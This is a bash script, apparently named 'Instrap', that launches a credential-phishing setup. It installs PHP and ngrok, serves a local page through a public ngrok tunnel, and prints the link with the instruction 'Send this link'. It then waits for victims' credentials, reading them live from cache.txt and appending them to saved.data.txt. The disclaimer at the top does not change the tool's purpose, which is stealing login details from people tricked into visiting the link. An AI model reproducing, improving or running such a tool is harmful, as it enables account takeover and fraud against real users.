#!/bin/bash
#Coded by Cortitan
#We are not responsible for any misuse or damange caused by Instrap.

logo=$(toilet -f future "INSTRAP" --metal --filter border)
clear
pkgs_installation() {
if [[ `command -v php` && `command -v curl` && `command -v unzip` ]]; then
echo "" > /dev/null
else
echo ""
echo "$logo"
pkgs=(php curl unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n=\e[96m[\e[31m + \e[96m]\e[31m Installing: $pkg\n\e[0m"
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg"
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n=\e[96m[\e[31m + \e[96m]\e[31m Unsupported package manager , Install packages manually\n\e[0m"
                                fi
                        }
                done
fi
}
install_ngrok() {
        if [[ `command -v ./ngrok` ]]; then
                echo "" > /dev/null
        else
		echo ""
		echo "$logo"
                echo -e "\n=\e[96m[\e[31m + \e[96m]\e[31m Installing ngrok...\n\e[0m"
                arch=`uname -m`
                if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
                        curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
                        unzip ngrok-stable-linux-arm.zip > /dev/null 2<&1
                        rm ngrok-stable-linux-arm.zip > /dev/null 2<&1
                elif [[ "$arch" == *'aarch64'* ]]; then
                        curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip
                        unzip ngrok-stable-linux-arm64.zip > /dev/null 2<&1
                        rm ngrok-stable-linux-arm64.zip > /dev/null 2<&1
                elif [[ "$arch" == *'x86_64'* ]]; then
                        curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
                        unzip ngrok-stable-linux-amd64.zip > /dev/null 2<&1
                        rm ngrok-stable-linux-amd64.zip > /dev/null 2<&1
                else
                        curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
                        unzip ngrok-stable-linux-386.zip > /dev/null 2<&1
                        rm ngrok-stable-linux-386.zip > /dev/null 2<&1
                fi
        fi
}

pkgs_installation
install_ngrok

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
fi
clear
cat cache.txt >> saved.data.txt
rm cache.txt
touch cache.txt
echo ""
echo "$logo"
echo ""
read -p "Do you want to continue(y/n)" ask
if [ "$ask" == "n" ];then
	exit
fi
clear
echo ""
echo "$logo"
echo ""
echo -e "\e[37m=[\e[31m + \e[37m]\e[31m Starting PHP server\e[0m"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2
echo ""
echo -e "\t\e[37m[\e[36m # \e[37m]\e[36m PHP server stared\e[0m"
echo ""
echo -e "\e[37m=[\e[31m + \e[37m]\e[31m Starting Ngrok server\e[0m"
./ngrok http 8080 > /dev/null 2>&1 &
sleep 10
echo ""
echo -e "\t\e[37m[\e[36m # \e[37m]\e[36m Ngrok server stared\e[0m"
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
clear
echo ""
echo "$logo"
echo ""
echo -e "\e[31m]==|=Send=this=link=>\e[0m  \e[36m$link\e[0m"
echo ""
echo -e "\e[37m[\e[31m#\e[37m]\e[0m Waiting for creds \e[37m[\e[31m#\e[37m]\e[0m"

echo "---------------------------"
tail -f cache.txt

